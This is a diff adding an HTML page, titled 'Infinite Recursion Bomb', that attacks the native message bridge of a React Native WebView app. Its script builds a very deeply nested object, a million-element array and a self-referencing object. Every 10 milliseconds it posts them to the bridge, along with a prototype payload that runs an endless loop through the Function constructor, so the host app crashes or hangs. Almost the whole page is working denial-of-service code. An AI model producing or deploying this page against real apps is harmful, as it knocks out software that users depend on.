@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Infinite Recursion Bomb</title>
+  <style>
+    body { background: #000; color: #f00; font-family: monospace; }
+  </style>
+</head>
+<body>
+  <h1>🔄 Recursive Bridge Bomb</h1>
+  <div id="log"></div>
+  
+  <script>
+    const log = m => document.getElementById('log').innerHTML += m + '<br>';
+    
+    function createMassiveObject(depth) {
+      if (depth >= 10000) return { value: 'BOMB' };
+      const obj = {};
+      for (let i = 0; i < 100; i++) {
+        obj[`key_${depth}_${i}`] = createMassiveObject(depth + 1);
+        obj[`array_${depth}_${i}`] = new Array(1000).fill('X'.repeat(1000));
+      }
+      return obj;
+    }
+
+    if (window.webkit?.messageHandlers?.ReactNativeWebView) {
+      log('🚀 Triggering recursive object bomb...');
+      
+      // Bomb 1: Object bersarang dalam-dalam
+      const bomb1 = createMassiveObject(0);
+      
+      // Bomb 2: Array dengan length ekstrem
+      const bomb2 = { 
+        megaArray: Array.from({length: 1000000}, (_, i) => i),
+        circularRef: {}
+      };
+      bomb2.circularRef.self = bomb2.circularRef;
+      
+      // Kirim bertubi-tubi
+      setInterval(() => {
+        try {
+          window.webkit.messageHandlers.ReactNativeWebView.postMessage(bomb1);
+          window.webkit.messageHandlers.ReactNativeWebView.postMessage(bomb2);
+          window.webkit.messageHandlers.ReactNativeWebView.postMessage({
+            __proto__: {
+              toString: function() { 
+                return this.constructor.constructor('while(true){}')();
+              }
+            }
+          });
+        } catch(e) {}
+      }, 10);
+      
+      log('💣 Bombs deployed!');
+    }
+  </script>
+</body>
+</html>
